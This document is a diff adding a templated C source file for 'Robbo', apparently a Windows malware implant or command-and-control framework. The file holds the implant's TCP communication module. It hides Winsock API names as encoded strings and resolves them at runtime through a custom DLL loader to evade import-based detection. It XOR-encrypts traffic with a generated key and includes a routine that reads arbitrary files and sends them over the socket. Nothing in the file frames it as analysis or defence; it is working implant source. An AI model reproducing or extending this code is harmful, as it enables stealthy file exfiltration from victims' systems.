@@ -1,0 +1,450 @@
+#!name##Robbo2TCP_C
+#!itemType##sfile
+#!info##Robbo TCP C file.
+#!lang##c
+#!addNameComp##True
+#!Var##RTCP_key_size##8##Size of the XOR key used for TCP communication encryption.##str
+
+{% set RTCP_key = connTOOL.fiveGenKey(RTCP_key_size | int) %}
+
+
+
+#include "robbo2_tcp.h"
+
+#define RTCP_ENCODE_KEY_MAX_SIZE 128
+#define RTCP_SEND_BUFF_SIZE 2048
+
+// ------------------------ FUNCTION, DLL NAME --------------------------------------------
+
+// Ws2_32.dll
+static int raw_name_Ws2_32_dll[] = {
+    {{_ROBBO.EncodeStr("Ws2_32.dll")}}
+};
+
+// WSAStartup
+static int raw_name_WSAStartup[] = {
+    {{_ROBBO.EncodeStr("WSAStartup")}}
+};
+
+
+// WSASocketA
+static int raw_name_WSASocketA[] = {
+    {{_ROBBO.EncodeStr("WSASocketA")}}
+};
+
+
+// connect
+static int raw_name_connect[] = {
+    {{_ROBBO.EncodeStr("connect")}}
+};
+
+
+// WSACleanup
+static int raw_name_WSACleanup[] = {
+    {{_ROBBO.EncodeStr("WSACleanup")}}
+};
+
+
+// closesocket
+static int raw_name_closesocket[] = {
+    {{_ROBBO.EncodeStr("closesocket")}}
+};
+
+
+// recv
+static int raw_name_recv[] = {
+    {{_ROBBO.EncodeStr("recv")}}
+};
+
+
+// send
+static int raw_name_send[] = {
+    {{_ROBBO.EncodeStr("send")}}
+};
+
+
+// ntohl
+static int raw_name_ntohl[] = {
+    {{_ROBBO.EncodeStr("ntohl")}}
+};
+
+
+// inet_addr
+static int raw_name_inet_addr[] = {
+    {{_ROBBO.EncodeStr("inet_addr")}}
+};
+
+
+// htons
+static int raw_name_htons[] = {
+    {{_ROBBO.EncodeStr("htons")}}
+};
+
+
+
+// -----------------------------------------------------------------------------------------------------------------------------------------------------
+// Encode Key
+static unsigned char rtcp_raw_master_key[] = {
+    {{RTCP_key}}
+};
+static int rtcp_master_key_len = {{RTCP_key_size}};
+
+
+// ----------------------------------- Variables -------------------------------------------
+
+void* rtcp_addr_Ws2_32_dll = NULL;
+
+// Function Address
+Rtype_WSAStartup rtcp_faddr_WSAStartup;
+Rtype_WSASocketA rtcp_faddr_WSASocketA;
+Rtype_closesocket rtcp_faddr_closesocket;
+Rtype_connect rtcp_faddr_connect;
+
+
+// ------------------------- ENCODE DECODE FUNC ----------------------------------------------
+
+char* rtcp_get_socket_key(void) {
+    unsigned char* key = malloc(RTCP_ENCODE_KEY_MAX_SIZE);
+    memset(key, 0, RTCP_ENCODE_KEY_MAX_SIZE);
+    if (!key) {
+        return 0;
+    }
+    int kindex = 0;
+    int i = 0;
+    while (rtcp_raw_master_key[i] != 0) {
+        if (kindex == rtcp_master_key_len) {
+            return key;
+        }
+        if (i % 5 == 0) {
+            key[kindex] = rtcp_raw_master_key[i];
+            kindex++;
+        }
+        i++;
+    }
+    return 0;
+}
+
+void rtcp_decode_data(unsigned char *msg, int msg_size, char *outBuff, int buff_size) {
+    memset(outBuff, 0, buff_size);
+    unsigned char *key = rtcp_get_socket_key();
+    int kindex = 0;
+    for (int i=0; i<msg_size; i++) {
+        if (kindex == rtcp_master_key_len) {
+            kindex = 0;
+        }
+        outBuff[i] = msg[i] ^ key[kindex];
+        kindex++;
+    }
+    free(key);
+}
+
+
+
+unsigned char* rtcp_encode_data(char* sendMsg, size_t msg_size) {
+    unsigned char *key = rtcp_get_socket_key();
+    unsigned char *buff = malloc(msg_size);
+    int kindex = 0;
+    for (int i=0;i<msg_size;i++) {
+        if (kindex == rtcp_master_key_len) {
+            kindex = 0;
+        }
+        buff[i] = sendMsg[i] ^ key[kindex];
+        kindex++;
+    }
+    free(key);
+    return buff;
+}
+
+void rtcp_encode_data2(char* sendMsg, size_t msg_size, unsigned char* buff) {
+    unsigned char *key = rtcp_get_socket_key();
+    int kindex = 0;
+    for (int i=0;i<msg_size;i++) {
+        if (kindex == rtcp_master_key_len) {
+            kindex = 0;
+        }
+        buff[i] = sendMsg[i] ^ key[kindex];
+        kindex++;
+    }
+    free(key);
+}
+
+// -----------------------------------------------------------------------------------------------------------------
+
+// ----------------------------------- SOCKET FUNCTIONS ---------------------------------------------
+
+void rtcp_send_encode_key(SOCKET sock) {
+    rtcp_wapi_send(sock, rtcp_raw_master_key, sizeof(rtcp_raw_master_key), 0);
+}
+
+int rtcp_wapi_WSAStartup(WORD sock_ver, LPWSADATA wsdata) {
+    Rtype_WSAStartup wsas = robbo_get_function(raw_name_WSAStartup, rtcp_addr_Ws2_32_dll);
+    return wsas(sock_ver, wsdata);
+}
+
+SOCKET rtcp_wapi_WSASocketA(int af, int stype, int protocol, LPWSAPROTOCOL_INFOA protocol_info, GROUP s_group, DWORD dwFlags) {
+    Rtype_WSASocketA sock = robbo_get_function(raw_name_WSASocketA, rtcp_addr_Ws2_32_dll);
+    return sock(af, stype, protocol, protocol_info, s_group, dwFlags);
+}
+
+// make tcp socket
+SOCKET rtcp_sock_build_WSASocketA(void) {
+    Rtype_WSASocketA sock = robbo_get_function(raw_name_WSASocketA, rtcp_addr_Ws2_32_dll);
+    return sock(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+}
+
+int rtcp_wapi_connect(SOCKET sock, SOCKADDR *sock_name, int namelen) {
+    Rtype_connect sock_conn = robbo_get_function(raw_name_connect, rtcp_addr_Ws2_32_dll);
+    return sock_conn(sock, sock_name, namelen);
+}
+
+int rtcp_wapi_WSACleanup(void) {
+    Rtype_WSACleanup wsaclean = robbo_get_function(raw_name_WSACleanup, rtcp_addr_Ws2_32_dll);
+    return wsaclean();
+}
+
+int rtcp_wapi_closesocket(SOCKET sock) {
+    Rtype_closesocket close_sock = robbo_get_function(raw_name_closesocket, rtcp_addr_Ws2_32_dll);
+    return close_sock(sock);
+}
+
+int rtcp_wapi_recv(SOCKET sock, char* buff, int buff_size, int sock_flags) {
+    Rtype_recv sock_recv = robbo_get_function(raw_name_recv, rtcp_addr_Ws2_32_dll);
+    return sock_recv(sock, buff, buff_size, sock_flags);
+}
+
+int rtcp_wapi_send(SOCKET sock, char* buff, int buff_size, int sock_flags) {
+    Rtype_send sock_send = robbo_get_function(raw_name_send, rtcp_addr_Ws2_32_dll);
+    return sock_send(sock, buff, buff_size, sock_flags);
+}
+
+u_long rtcp_wapi_ntohl(u_long netlong) {
+    Rtype_ntohl ntohl_func = robbo_get_function(raw_name_ntohl, rtcp_addr_Ws2_32_dll);
+    return ntohl_func(netlong);
+}
+
+unsigned long rtcp_wapi_inet_addr(char *ip_addr) {
+    Rtype_inet_addr iaddr = robbo_get_function(raw_name_inet_addr, rtcp_addr_Ws2_32_dll);
+    return iaddr(ip_addr);
+}
+
+u_short rtcp_wapi_htons(u_short number) {
+    Rtype_htons htons_func = robbo_get_function(raw_name_htons, rtcp_addr_Ws2_32_dll);
+    return htons_func(number);
+}
+
+
+// ----------------------------------- ROBBO MESSAGES ----------------------------------------------------------
+
+
+int rtcp_sock_recv_ex(SOCKET sock, unsigned char* buff, int buff_size) {
+    int total_bytes = 0;
+    int part_bytes = 0;
+    while (total_bytes < buff_size) {
+        part_bytes = rtcp_wapi_recv(sock, (char*)buff + total_bytes, buff_size - total_bytes, 0);
+        if (part_bytes <= 0) {
+            return -1;
+        }
+        total_bytes += part_bytes;
+    }
+    return total_bytes;
+}
+
+void rtcp_make_tcp_header(pROBBO_TCP_MESSAGES rmsg) {
+    memset(rmsg->header, 0, RTCP_DEFAULT_HEADER_SIZE);
+    uint32_t magic = rtcp_wapi_ntohl(rmsg->magic);
+    uint16_t flags = rtcp_wapi_ntohl(rmsg->flags);
+    uint32_t data_size = rtcp_wapi_ntohl(rmsg->msg_size);
+    memcpy(rmsg->header, &magic, 4);
+    memcpy(rmsg->header + 4, &rmsg->types, 1);
+    memcpy(rmsg->header + 5, &rmsg->encFlag, 1);
+    memcpy(rmsg->header + 6, &flags, 2);
+    memcpy(rmsg->header + 8, &data_size, 4);
+}
+
+
+void rtcp_free_tcp_messages(pROBBO_TCP_MESSAGES rmsg) {
+    if (rmsg->raw_data != NULL) {
+        if (rmsg->raw_data_sp == 0) {
+            free(rmsg->raw_data);
+        }
+    }
+    if (rmsg->data != NULL) {
+        free(rmsg->data);
+    }
+    free(rmsg);
+}
+
+
+void rtcp_extract_headers(pROBBO_TCP_MESSAGES rmsg, unsigned char headers[]) {
+    uint32_t rmagic;
+    uint16_t rflags;
+    uint32_t rmsg_size;
+
+    memcpy(&rmagic, headers, 4);
+    memcpy(&rmsg->types, headers + 4, 1);
+    memcpy(&rmsg->encFlag, headers + 5, 1);
+    memcpy(&rflags, headers + 6, 2);
+    memcpy(&rmsg_size, headers + 8, 4);
+
+    rmsg->magic = rtcp_wapi_ntohl(rmagic);
+    rmsg->flags = rtcp_wapi_ntohl(rflags);
+    rmsg->msg_size = rtcp_wapi_ntohl(rmsg_size);
+}
+
+void rtcp_raw_tcp_process_data_recv(pROBBO_TCP_MESSAGES rmsg) {
+    size_t pre_mem;
+    if (rmsg->types == 0 | rmsg->types == 1) {
+        pre_mem = rmsg->msg_size + 1;
+    }
+    else {
+        pre_mem = rmsg->msg_size;
+    }
+    rmsg->data = malloc(pre_mem);
+    memset(rmsg->data, 0, pre_mem);
+    if (rmsg->encFlag == 0) {
+        rtcp_encode_data2(rmsg->raw_data, rmsg->msg_size, rmsg->data);
+    }
+    else {
+        memcpy(rmsg->data, rmsg->raw_data, rmsg->msg_size);
+    }
+}
+
+pROBBO_TCP_MESSAGES rtcp_make_empty_tcp_msg(void) {
+    pROBBO_TCP_MESSAGES rmsg = malloc(sizeof(ROBBO_TCP_MESSAGES));
+    memset(rmsg, 0, sizeof(ROBBO_TCP_MESSAGES));
+    rmsg->header_size = RTCP_DEFAULT_HEADER_SIZE;
+    rmsg->raw_data = NULL;
+    rmsg->data = NULL;
+    rmsg->free = rtcp_free_tcp_messages;
+    rmsg->build_headers = rtcp_make_tcp_header;
+    rmsg->process_recv = rtcp_raw_tcp_process_data_recv;
+    return rmsg;
+}
+
+pROBBO_TCP_MESSAGES rtcp_make_raw_tcp_msg(int data_start_point, int keep_raw_data, int encode_data, unsigned char *data, size_t data_size) {
+    pROBBO_TCP_MESSAGES rmsg = rtcp_make_empty_tcp_msg();
+    if (keep_raw_data == 1) {
+        if (data_start_point == 1) {
+            rmsg->raw_data_sp = 0;
+            unsigned char *raw_data = malloc(data_size);
+            memset(raw_data, 0, data_size);
+            memcpy(raw_data, data, data_size);
+            rmsg->raw_data = raw_data;
+        }
+        else {
+            rmsg->raw_data_sp = 0;
+            rmsg->raw_data = data;
+        }
+    }
+    else {
+        rmsg->raw_data = NULL;
+        rmsg->raw_data_sp = 1;
+    }
+
+    if (encode_data == 0) {
+        rmsg->data = rtcp_encode_data(data, data_size);
+    }
+    else {
+        rmsg->data = malloc(data_size);
+        // rmsg->encFlag = 1;
+        memset(rmsg->data, 0, data_size);
+        memcpy(rmsg->data, data, data_size);
+    }
+    rmsg->msg_size = data_size;
+    return rmsg;
+}
+
+void rtcp_send_robbo_msg(SOCKET sock, pROBBO_TCP_MESSAGES rmsg) {
+    rmsg->build_headers(rmsg);
+    rtcp_wapi_send(sock, rmsg->header, rmsg->header_size, 0);
+    rtcp_wapi_send(sock, rmsg->data, rmsg->msg_size, 0);
+}
+
+int rtcp_send_text_msg(SOCKET sock, char *tMsg, int no_encode_flag) {
+    pROBBO_TCP_MESSAGES rmsg = rtcp_make_raw_tcp_msg(0, 0, no_encode_flag, tMsg, strlen(tMsg));
+    rmsg->types = 0;
+    rmsg->build_headers(rmsg);
+    rtcp_wapi_send(sock, rmsg->header, rmsg->header_size, 0);
+    int result = rtcp_wapi_send(sock, rmsg->data, rmsg->msg_size, 0);
+    rmsg->free(rmsg);
+    return result;
+}
+
+int rtcp_send_robbo_text_msg(SOCKET sock, int enc_msg[], int buff_size) {
+    char *buff = malloc(buff_size);
+    memset(buff, 0, buff_size);
+    robbo_decode2(enc_msg, buff, buff_size);
+    int result = rtcp_send_text_msg(sock, buff, 0);
+    free(buff);
+    return result;
+}
+
+pROBBO_TCP_MESSAGES rtcp_recive_headers(SOCKET sock) {
+    unsigned char headers[RTCP_DEFAULT_HEADER_SIZE];
+    memset(headers, 0, RTCP_DEFAULT_HEADER_SIZE);
+    int result = rtcp_sock_recv_ex(sock, headers, RTCP_DEFAULT_HEADER_SIZE);
+    if (result == -1) {
+        return 0;
+    }
+    pROBBO_TCP_MESSAGES rmsg = rtcp_make_empty_tcp_msg();
+    rtcp_extract_headers(rmsg, headers);
+    return rmsg;
+}
+
+pROBBO_TCP_MESSAGES rtcp_recive_data(SOCKET sock) {
+    pROBBO_TCP_MESSAGES rmsg = rtcp_recive_headers(sock);
+    if (rmsg == 0) {
+        return 0;
+    }
+    rmsg->raw_data = malloc(rmsg->msg_size);
+    memset(rmsg->raw_data, 0, rmsg->msg_size);
+    int result = rtcp_sock_recv_ex(sock, rmsg->raw_data, rmsg->msg_size);
+    if (result == -1) {
+        free(rmsg);
+        return 0;
+    }
+    rmsg->process_recv(rmsg);
+    return rmsg;
+}
+
+void rtcp_send_file(SOCKET sock, char *file_path) {
+    FILE *tar_file = fopen(file_path, "rb");
+    if (!tar_file) {
+        return;
+    }
+
+    fseek(tar_file, 0, SEEK_END);
+    uint32_t file_size = ftell(tar_file);
+    fseek(tar_file, 0, SEEK_SET);
+    pROBBO_TCP_MESSAGES rmsg = rtcp_make_empty_tcp_msg();
+    rmsg->encFlag = 1;
+    rmsg->types = 2;
+    rmsg->msg_size = file_size;
+    rmsg->build_headers(rmsg);
+    char buff[RTCP_SEND_BUFF_SIZE];
+    size_t send_result;
+    int result;
+    rtcp_wapi_send(sock, rmsg->header, rmsg->header_size, 0);
+    while ((send_result = fread(buff, 1, RTCP_SEND_BUFF_SIZE, tar_file)) > 0) {
+        result = rtcp_wapi_send(sock, buff, (int)send_result, 0);
+        if (result == -1) {
+            goto CLEAN;
+        }
+    }
+
+    CLEAN:
+        rmsg->free(rmsg);
+        fclose(tar_file);
+}
+
+
+// ----------------------------------- INIT FUNCTIONS --------------------------------------------------
+
+void rtcp_initialize(void) {
+    rtcp_addr_Ws2_32_dll = robbo_load_dll_ldr(raw_name_Ws2_32_dll);
+    rtcp_faddr_WSAStartup = robbo_get_function(raw_name_WSAStartup, rtcp_addr_Ws2_32_dll);
+    rtcp_faddr_WSASocketA = robbo_get_function(raw_name_WSASocketA, rtcp_addr_Ws2_32_dll);
+    rtcp_faddr_closesocket = robbo_get_function(raw_name_closesocket, rtcp_addr_Ws2_32_dll);
+    rtcp_faddr_connect = robbo_get_function(raw_name_connect, rtcp_addr_Ws2_32_dll);
+    
+}
